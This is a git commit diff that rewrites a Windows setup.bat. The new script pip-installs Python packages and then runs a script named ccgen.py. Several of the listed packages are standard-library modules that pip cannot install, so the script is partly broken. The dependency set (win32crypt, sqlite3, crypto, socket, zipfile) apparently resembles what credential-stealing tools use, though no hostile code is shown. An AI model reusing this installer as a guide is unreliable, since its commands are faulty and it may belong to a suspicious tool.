8cc0a29cad3f7ed5d66c20c989acee54f38b46d5
versayy <anthianthyc@gmail.com>
2024-06-22 14:27:50 +0200

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,2 +1,14 @@
 cls
-pip install cryptodome
+pip install subprocess
+pip install customtkinter
+pip install shutil
+pip install base64
+pip install sqlite3
+pip install socket
+pip install zipfile
+pip uninstall crypto 
+pip uninstall pycrypto 
+pip install pycryptodome
+pip install win32crypt
+cls
+python ccgen.py
